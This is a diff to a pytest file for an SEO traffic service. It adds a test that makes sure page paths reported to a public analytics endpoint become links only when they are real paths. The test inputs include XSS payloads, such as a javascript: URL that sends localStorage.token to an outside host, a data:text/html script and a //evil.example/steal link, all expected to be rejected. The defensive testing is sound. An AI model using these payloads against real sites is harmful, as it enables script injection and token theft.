@@ -221,3 +221,23 @@ def test_one_article_under_two_spellings_is_ranked_once(client, auth, monkeypatc
     # The per-site page list still shows what Umami reported, row for row.
     tax = next(s for s in body["sites"] if s["key"] == "tax")
     assert [p["views"] for p in tax["top_pages"]] == [50, 70, 40]
+
+
+# Umami's collect endpoint is public, so a page "path" is whatever anybody sent.
+# Anything that was not a path used to be passed through as the link itself.
+@pytest.mark.parametrize(
+    "path,link",
+    [
+        ("/blog/a", "https://tax.doaide.com/blog/a"),
+        ("https://tax.doaide.com/x", "https://tax.doaide.com/x"),
+        ("javascript:fetch('//x/?'+localStorage.token)", None),
+        ("JaVaScRiPt:alert(1)", None),
+        ("data:text/html,<script>alert(1)</script>", None),
+        ("//evil.example/steal", None),
+        ("blog/a", None),
+    ],
+)
+def test_a_reported_path_is_only_a_link_if_it_is_one(path, link):
+    from app.services.seo_traffic import _page_link
+
+    assert _page_link("tax.doaide.com", path) == link
